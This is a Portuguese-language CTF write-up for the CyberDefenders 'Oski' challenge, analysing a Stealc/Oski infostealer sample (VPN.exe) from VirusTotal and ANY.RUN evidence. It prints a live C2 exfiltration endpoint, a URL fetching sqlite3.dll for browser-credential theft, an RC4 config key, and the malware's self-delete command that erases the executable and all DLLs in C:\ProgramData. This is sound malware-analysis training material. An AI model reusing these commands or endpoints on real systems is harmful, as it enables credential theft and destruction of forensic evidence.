# 🔍 Oski — CTF Writeup
### CyberDefenders Blue Team Challenge | Análise de Malware (VPN.exe — Stealc / Oski Infostealer)

---

| **Analista**          | Mauricio Robert                                                                     |
|-----------------------|---------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                     |
| **Data do Relatório** | 17/07/2026                                                                            |
| **Data do Incidente** | 28/09/2022 (criação do artefato) — Fonte: VirusTotal / ANY.RUN                        |
| **Classificação**     | CONFIDENCIAL                                                                          |
| **Ferramentas**       | VirusTotal, ANY.RUN Sandbox, Snort (Registered User Ruleset)                          |
| **Caso CTF**          | Oski — Blue Team CTF Challenges (VPN.exe)                                            |

---

## 🔍 Resumo Executivo

Este relatório documenta a análise forense do artefato malicioso **`VPN.exe`** (SHA-256: `a040a0af8697e30506218103074c7d6ea77a84ba3ac1ee5efae20f15530a19bb`), distribuído por meio de um **arquivo de apresentação (PPT)** e identificado pela sandbox **ANY.RUN** como pertencente à família **Stealc**, com fortes indicadores adicionais de comportamento associado ao malware **Oski**. A amostra é um executável **PE32** compilado com **Microsoft Visual C/C++**, criado em **28/09/2022**, que ao ser executado estabelece comunicação com um servidor de **comando e controle (C2)** localizado em **171.22.28.221**, realizando o download de uma biblioteca auxiliar (**sqlite3.dll**) utilizada para acessar e exfiltrar credenciais armazenadas em navegadores web. Após a exfiltração dos dados da vítima via requisição **HTTP POST**, o malware executa uma rotina de **autoexclusão (self-delete)**, removendo o próprio executável e todos os arquivos `.dll` da pasta `C:\ProgramData`, com o objetivo de dificultar a análise forense posterior. Ao todo, **sete questões técnicas** foram respondidas com base em evidências extraídas do **VirusTotal** e do relatório de sandbox do **ANY.RUN**.

---

## 🛠 Ferramentas e Fontes Utilizadas

| Ferramenta / Fonte              | Finalidade                                                                                   | Referência                                                          |
|-----------------------------------|-------------------------------------------------------------------------------------------------|------------------------------------------------------------------------|
| **VirusTotal**                    | Metadados estáticos do arquivo, hashes, datas de criação e submissão                            | `virustotal.com/gui/file/a040a0af8697e3...`                          |
| **ANY.RUN Sandbox**               | Análise dinâmica de comportamento (processos filhos, rede, MITRE ATT&CK)                        | `app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44`             |
| **Snort (Regras registradas)**    | Detecção de shellcode e indicadores de exploração na comunicação de rede                        | Ruleset: Snort registered user ruleset                                |

---

## 📋 Perguntas e Respostas

### Q1 — What was the time of malware creation?

> **Resposta: `2022-09-28 17:40 (UTC)`**

**Solução:** A seção **"History"** da página de detalhes do VirusTotal para o arquivo `VPN.exe` (`a040a0af8697e30506218103074c7d6ea77a84ba3ac1ee5efae20f15530a19bb`) exibe o campo **"Creation Time"** destacado com o valor **2022-09-28 17:40:46 UTC**, correspondente à data de compilação do executável (timestamp do cabeçalho PE), anterior à primeira submissão registrada em 2023-09-23.

![Time of Malware Creation](/Forensic/Oski/images/Data_of_Creation_Malware(1).png)

---

### Q2 — Which C2 server does the malware in the PPT file communicate with?

> **Resposta: `http://171.22.28.221/5c06c05b7b34e8e6.php`**

**Solução:** Na seção **"Network Communication → HTTP Requests"** do relatório de atividade do VirusTotal, observa-se uma requisição **HTTP POST** destacada endereçada a **`http://171.22.28.221/5c06c05b7b34e8e6.php`**. Esse endpoint corresponde ao servidor de comando e controle (C2) utilizado pelo malware para exfiltrar os dados coletados da vítima, distinto das demais requisições legítimas de checagem de conectividade (`dns.msftncsi.com`, `time.windows.com`).

![C2](/Forensic/Oski/images/URL_File_C2(2).png)

---

### Q3 — What is the first library that the malware requests post-infection?

> **Resposta: `sqlite3.dll`**

**Solução:** A primeira requisição HTTP registrada logo após a infecção é uma requisição **GET** para `http://171.22.28.221/9e226a84ec50246d/sqlite3.dll`, destacada na lista de **"HTTP Requests"** do VirusTotal. Essa biblioteca é utilizada por malwares da família Stealc/Oski para consultar os bancos de dados SQLite usados por navegadores (Chrome, Firefox, Edge) no armazenamento de senhas, cookies e dados de formulários, viabilizando o roubo de credenciais.

![Post Infection Library](/Forensic/Oski/images/First_Library_Malware_Request(3).png)

---

### Q4 — What RC4 key is used by the malware to decrypt its base64-encoded string?

> **Resposta: `5329514621441247975720749009`**

**Solução:** O relatório do ANY.RUN, na seção **"Malware configuration → Stealc"**, lista as chaves de configuração extraídas do processo `VPN.exe` (PID 3484), incluindo o campo **"RC4"** com a chave **`5329514621441247975720749009`**, destacada na interface. Essa chave é utilizada pelo malware para decriptar strings codificadas em base64 presentes em sua configuração interna, incluindo o próprio endereço do servidor C2.

![RC4](/Forensic/Oski/images/RC4_Key(4).png)

---

### Q5 — Identify the main MITRE technique (not sub-techniques) the malware uses to steal the user's password.

> **Resposta: `T1555 — Credentials from Password Stores`**

**Solução:** O painel **"Advanced details of process"** do ANY.RUN, na aba de indicadores de perigo ("Danger"), lista a técnica **T1555.003 — Credentials from Web Browsers**, com o rótulo **"Steals credentials"** destacado em amarelo, referente ao roubo de credenciais armazenadas em navegadores web. A técnica principal do MITRE ATT&CK, da qual T1555.003 é uma sub-técnica, é **T1555 — Credentials from Password Stores**.

![MITRE ATT&CK](/Forensic/Oski/images/MITRE_ATT&CK_Steal_Credential_ID(5).png)

---

### Q6 — Which directory does the malware target for the deletion of all DLL files?

> **Resposta: `C:\ProgramData`**

**Solução:** A janela **"Behavior activities"** do processo `VPN.exe` (PID 3484) no ANY.RUN exibe o evento **"Starts CMD.EXE for self-deleting"**, cuja linha de comando é:

```
"C:\Windows\system32\cmd.exe" /c timeout /t 5 & del /f /q "C:\Users\admin\AppData\Local\Temp\VPN.exe" & del "C:\ProgramData\*.dll"" & exit
```

O trecho **`C:\ProgramData\*.dll`** está destacado, indicando que o malware exclui todos os arquivos DLL presentes nesse diretório como parte de sua rotina de autoexclusão e limpeza de evidências.

![Directory Target](/Forensic/Oski/images/Directory_Malware_Delete_.dll(6).png)

---

### Q7 — After successfully exfiltrating the user's data, how many seconds does it take for the malware to self-delete?

> **Resposta: `5 segundos`**

**Solução:** A mesma linha de comando do processo filho `cmd.exe`, exibida na janela **"Behavior activities"** do ANY.RUN, contém o parâmetro **`timeout /t 5`** destacado, que instrui o interpretador de comandos a aguardar **5 segundos** antes de excluir o executável `VPN.exe` e os arquivos DLL da pasta `ProgramData`. Esse atraso permite que o processo principal seja encerrado antes da tentativa de exclusão do próprio arquivo em execução.

![Time](/Forensic/Oski/images/After_Extrafilation_Time_to_Malware_Delete(7).png)

---

## ⛓ Fluxo do Ataque (Kill Chain)

```
[FASE 1 — ENTREGA]
    Arquivo de apresentação (PPT) malicioso entregue à vítima
    Execução do payload embutido: VPN.exe
    ↓
[FASE 2 — EXECUÇÃO E COMPILAÇÃO]
    VPN.exe (PE32, Visual C/C++, criado em 2022-09-28 17:40:46 UTC)
    Executado como processo principal (PID 3484), usuário "admin"
    ↓
[FASE 3 — DOWNLOAD DE BIBLIOTECA AUXILIAR]
    GET http://171.22.28.221/9e226a84ec50246d/sqlite3.dll
    Biblioteca usada para consultar bancos SQLite de navegadores
    ↓
[FASE 4 — ROUBO DE CREDENCIAIS]
    T1555 (Credentials from Password Stores)
        └─ T1555.003 — Credentials from Web Browsers
    Coleta de senhas, cookies e dados de formulários salvos
    Chave RC4 (5329514621441247975720749009) decripta strings/config
    ↓
[FASE 5 — EXFILTRAÇÃO (C2)]
    POST http://171.22.28.221/5c06c05b7b34e8e6.php
    T1071 — Application Layer Protocol (conexão ao servidor C2)
    ↓
[FASE 6 — ANTI-FORENSE / AUTOEXCLUSÃO]
    cmd.exe /c timeout /t 5 & del /f /q VPN.exe & del C:\ProgramData\*.dll & exit
    T1070.004 — File Deletion
    Aguarda 5 segundos e remove o executável + todas as DLLs de ProgramData
```

---

## 🗺 Mapeamento Investigativo

| Pergunta | Fonte de Evidência | Artefato |
|----------|--------------------|----------|
| Data de criação do malware | VirusTotal → aba *Details* → "History" | `2022-09-28 17:40:46 UTC` |
| Servidor C2 usado pelo malware | VirusTotal → "Network Communication → HTTP Requests" (POST) | `171.22.28.221/5c06c05b7b34e8e6.php` |
| Primeira biblioteca requisitada | VirusTotal → "HTTP Requests" (GET) | `sqlite3.dll` |
| Chave RC4 usada para decriptar strings | ANY.RUN → "Malware configuration → Stealc" | `5329514621441247975720749009` |
| Técnica MITRE de roubo de senha | ANY.RUN → "Advanced details of process" → Danger | `T1555` (sub-técnica T1555.003) |
| Diretório-alvo da exclusão de DLLs | ANY.RUN → "Behavior activities" (cmd.exe) | `C:\ProgramData\*.dll` |
| Tempo até a autoexclusão pós-exfiltração | ANY.RUN → "Behavior activities" (comando `timeout /t 5`) | `5 segundos` |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo | Valor | Contexto |
|------|-------|----------|
| Arquivo malicioso | `VPN.exe` (311.50 KB / 318.976 bytes) | SHA-256: `a040a0af8697e30506218103074c7d6ea77a84ba3ac1ee5efae20f15530a19bb` |
| Data de criação | `2022-09-28 17:40:46 UTC` | Timestamp de compilação do PE (VirusTotal) |
| Servidor C2 | `http://171.22.28.221/5c06c05b7b34e8e6.php` | Endpoint de exfiltração via HTTP POST |
| Biblioteca auxiliar | `sqlite3.dll` | Baixada via `http://171.22.28.221/9e226a84ec50246d/` |
| Chave RC4 | `5329514621441247975720749009` | Usada para decriptar strings base64 da configuração (família Stealc) |
| Técnica MITRE ATT&CK | `T1555` (sub-técnica `T1555.003`) | Credentials from Password Stores / Web Browsers |
| Diretório-alvo de limpeza | `C:\ProgramData\*.dll` | Excluído na rotina de autoexclusão do malware |
| Atraso de autoexclusão | `5 segundos` (`timeout /t 5`) | Tempo de espera antes da exclusão do `VPN.exe` e das DLLs |
| Processo/PID analisado | `VPN.exe (PID 3484)` | Processo principal analisado no ANY.RUN |
| Técnica (MITRE ATT&CK) | `T1070.004` | File Deletion (autoexclusão / anti-forense) |
| Técnica (MITRE ATT&CK) | `T1071` | Application Layer Protocol (comunicação com o C2) |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|------------------|
| Q1 | Horário de criação do malware | `2022-09-28 17:40` |
| Q2 | Servidor C2 com o qual o malware comunica | `http://171.22.28.221/5c06c05b7b34e8e6.php` |
| Q3 | Primeira biblioteca requisitada pós-infecção | `sqlite3.dll` |
| Q4 | Chave RC4 usada para decriptar strings base64 | `5329514621441247975720749009` |
| Q5 | Técnica MITRE principal de roubo de senha | `T1555` |
| Q6 | Diretório-alvo da exclusão de arquivos DLL | `C:\ProgramData` |
| Q7 | Segundos até a autoexclusão pós-exfiltração | `5` |

---

## 📚 Referências

- [VirusTotal — VPN.exe](https://virustotal.com/gui/file/a040a0af8697e30506218103074c7d6ea77a84ba3ac1ee5efae20f15530a19bb)
- [ANY.RUN Sandbox — Relatório de análise dinâmica](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44)
- [MITRE ATT&CK T1555 — Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- [MITRE ATT&CK T1555.003 — Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
- [MITRE ATT&CK T1070.004 — File Deletion](https://attack.mitre.org/techniques/T1070/004/)
- [MITRE ATT&CK T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)

---